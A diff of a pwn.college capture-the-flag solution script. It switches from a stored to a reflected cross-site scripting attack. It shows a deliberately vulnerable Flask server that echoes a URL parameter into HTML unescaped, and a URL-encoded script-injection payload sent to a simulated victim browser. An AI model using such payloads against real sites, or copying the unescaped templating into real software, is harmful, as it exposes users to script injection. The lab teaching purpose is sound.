@@ -12,56 +12,36 @@ attacker to gain some control within the victim's browser, leading to a number o
 downstream shenanigans.
 You will now have a /challenge/victim program that simulates a victim user visiting the web server.
 
-Stored xss:
-Inspecting the target website, the attacker can see that the site allows to permanently insert
-content posts into the websites database. The inserted content is then displayed as html text
-in all future requests to the website. The attacker crafts a malicious script and inserts it
-as content into the website. All users that visit the target website from now on will trigger
-the attack.
+
+Reflected xss:
+Inspecting the target website the atacker can see that the site takes unvalidated url parameter
+input that is directly inserted into a textarea element. The attacker crafts a malicious link
+using the target website url and a malicious script as url param. The attacker then spreads the
+link i.e. via forum, email etc. to as many useres of the target website as possible. Once a user
+clicks on the link, the attack is triggered.
 """
 
 '''
 Server:
 #!/opt/pwn.college/python
 
-import tempfile
-import sqlite3
 import flask
 import os
 
 app = flask.Flask(__name__)
 
-class TemporaryDB:
-    def __init__(self):
-        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
-
-    def execute(self, sql, parameters=()):
-        connection = sqlite3.connect(self.db_file.name)
-        connection.row_factory = sqlite3.Row
-        cursor = connection.cursor()
-        result = cursor.execute(sql, parameters)
-        connection.commit()
-        return result
-
-db = TemporaryDB()
-# https://www.sqlite.org/lang_createtable.html
-db.execute("""CREATE TABLE posts AS SELECT "First Post!" AS content""")
-
-@app.route("/", methods=["POST"])
-def challenge_post():
-    content = flask.request.form.get("content", "")
-    db.execute("INSERT INTO posts VALUES (?)", [content])
-    return flask.redirect(flask.request.path)
-
 @app.route("/", methods=["GET"])
 def challenge_get():
-    page = "<html><body>\nWelcome to pwnpost, the anonymous posting service. Post away!\n"
-    page += "<form method=post>Post:<input type=text name=content></form>\n"
-
-    for post in db.execute("SELECT content FROM posts").fetchall():
-        page += "<hr>" + post["content"] + "\n"
-
-    return page + "</body></html>"
+    return f"""
+        <html><body>
+        <h1>pwnmsg ephemeral message service</h1>
+        The message:
+        <form>
+            <textarea name=msg>{flask.request.args.get("msg", "Type your message here!")}</textarea>
+            <input type=submit value="Make URL!">
+        </form>
+        </body></html>
+    """
 
 app.secret_key = os.urandom(8)
 app.config['SERVER_NAME'] = f"challenge.localhost:80"
@@ -95,12 +75,18 @@ service = FirefoxService(log_path="/dev/null")
 browser = webdriver.Firefox(service=service, options=options)
 atexit.register(browser.quit)
 
-open_ports = { s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == 'LISTEN' }
-if 80 not in open_ports:
-    print("Service doesn't seem to be running?")
+if len(sys.argv) == 1:
+    print(f"Usage: {sys.argv[0]} URL")
     sys.exit(1)
-challenge_url = "http://challenge.localhost:80/"
-flag = open("/flag").read().strip()
+
+challenge_url = sys.argv[1]
+url_parsed = urllib.parse.urlparse(challenge_url)
+if url_parsed.hostname != "challenge.localhost":
+    print("Hostname should be 'challenge.localhost'.")
+    sys.exit(2)
+if url_parsed.port not in {None, 80}:
+    print("Port should be 80.")
+    sys.exit(3)
 
 print(f"Visiting {challenge_url}")
 browser.get(challenge_url)
@@ -111,8 +97,7 @@ except TimeoutException:
     sys.exit(3)
 else:
     print("Alert triggered! Your reward:")
-    print(flag)
-
+    print(open("/flag").read())
 '''
 
 pat0 = re.compile(r".*Running on http://challenge.localhost:80\n")
@@ -146,10 +131,7 @@ while True:
 
 	m = pat0.match(line)
 	if m:
-		url = "http://challenge.localhost:80/"
-		data = {"content": '<script>alert("PWNED")</script>'}
-		resp = requests.post(url, data=data)
-		print(resp.text)
+		url = "http://challenge.localhost:80/?msg=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%22PWNED%22%29%3B%3C%2Fscript%3E%3Ctextarea%20name%3D%22injected%22%3E"
 
 		pid = os.fork()
 
@@ -158,6 +140,6 @@ while True:
 			exit(1)
 
 		if pid == 0:
-			os.execv("/challenge/victim", ["/challenge/victim"])
+			os.execv("/challenge/victim", ["/challenge/victim", url])
 			print("Error execv.")
 			exit(1)
